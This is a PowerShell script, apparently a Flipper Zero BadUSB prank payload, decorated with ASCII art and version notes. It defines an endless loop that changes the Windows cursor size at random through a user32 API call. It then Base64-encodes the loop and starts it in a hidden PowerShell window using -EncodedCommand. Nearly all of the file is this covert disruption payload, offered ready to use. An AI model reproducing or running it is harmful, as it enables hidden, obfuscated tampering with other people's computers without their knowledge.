##################################################################################################################################################################
##################################################################################################################################################################
<#
                 _..--+~/@-~--.
             _-=~      (  .   "}
          _-~     _.--=.\ \""""
        _~      _-       \ \_\
       =      _=          '--'
      '      =                             .
     :      :       ____                   '=_. ___
___  |      ;                            ____ '~--.~.
     ;      ;                               _____  } |
  ___=       \ ___ __     __..-...__           ___/__/__
     :        =_     _.-~~          ~~--.__
_____ \         ~-+-~                   ___~=_______
     ~@#~~ == ...______ __ ___ _--~~--_
                                                    =
██████╗ ███████╗ █████╗ ███╗   ██╗ ██████╗██╗  ██╗███████╗███████╗ ██████╗ ██╗ ██████╗ █████╗ 
██╔══██╗██╔════╝██╔══██╗████╗  ██║██╔════╝██║  ██║██╔════╝╚══███╔╝██╔════╝███║██╔════╝██╔══██╗
██████╔╝███████╗███████║██╔██╗ ██║██║     ███████║█████╗    ███╔╝ ██║     ╚██║███████╗╚██████║
██╔══██╗╚════██║██╔══██║██║╚██╗██║██║     ██╔══██║██╔══╝   ███╔╝  ██║      ██║██╔═══██╗╚═══██║
██║  ██║███████║██║  ██║██║ ╚████║╚██████╗██║  ██║███████╗███████╗╚██████╗ ██║╚██████╔╝█████╔╝
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝ ╚═════╝ ╚════╝ 
Script Version: 1
OS Version Script was written on: Microsoft Windows 11 Pro : 10.0.25100 Build 26100
PSVersion 5.1.26100.2161 : PSEdition Desktop : Build Version 10.0.26100.2161
Flipper Zero FirmWare mntm-001 https://momentum-fw.dev/update/
Description of Script: 
#>
##################################################################################################################################################################
#==============================Beginning==========================================================================================================================
##################################################################################################################################################################
$scriptBlock = {
# Set a flag to control the loop
$x = $TRUE

# Define the SystemParametersInfo function
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class CursorRefresh {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SystemParametersInfo(int uAction, int uParam, int pvParam, int fWinIni);
}
"@

# Loop to update the cursor size with random values
DO {
    # Generate a random value between 1 and 100
    $randomValue = Get-Random -Minimum 1 -Maximum 101

    # Set the cursor size to the random value
    $cursorSize = $randomValue

    # Update the cursor size using SystemParametersInfo
    [CursorRefresh]::SystemParametersInfo(0x2029, 0, $cursorSize, 0x01)

    # Add a brief sleep to prevent excessive CPU usage
    Start-Sleep -Milliseconds 100

} While ($x)

}

# Convert the script block to a Base64-encoded string
$encodedScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock))

# Start the PowerShell process with a hidden window
Start-Process "powershell.exe" -ArgumentList "-WindowStyle Hidden -EncodedCommand $encodedScript" -NoNewWindow
##################################################################################################################################################################
#==============================End================================================================================================================================
##################################################################################################################################################################
